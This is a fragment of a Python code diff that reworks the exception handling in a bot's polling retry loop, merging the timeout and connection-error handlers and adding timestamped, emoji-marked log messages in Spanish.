-        except requests.exceptions.ReadTimeout:
+        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
             delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
-            print(f"[polling] ReadTimeout — reconectando en {delay}s (intento {attempt + 1})")
+            error_type = "Timeout" if isinstance(e, requests.exceptions.ReadTimeout) else "ConnectionError"
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️ {error_type}: {e}")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Reconectando en {delay}s... (Intento {attempt + 1})")
             time.sleep(delay)
             attempt += 1
-        except requests.exceptions.ConnectionError as e:
-            delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
-            print(f"[polling] ConnectionError: {e} — reconectando en {delay}s (intento {attempt + 1})")
-            time.sleep(delay)
-            attempt += 1
+            
         except Exception as e:
             delay = RETRY_DELAYS[min(attempt, len(RETRY_DELAYS) - 1)]
-            print(f"[polling] Error inesperado: {e}\n{traceback.format_exc()}")
-            print(f"[polling] Reconectando en {delay}s (intento {attempt + 1})")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Error inesperado: {type(e).__name__}")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] 📝 Detalle: {str(e)[:100]}")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Reiniciando en {delay}s...")
             time.sleep(delay)
             attempt += 1
+            
         else:
             attempt = 0
-            print("[polling] Polling terminó, reiniciando...")
-            time.sleep(2)
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Polling reiniciado correctamente")
+            time.sleep(3)
 
 if __name__ == "__main__":
     run_bot()
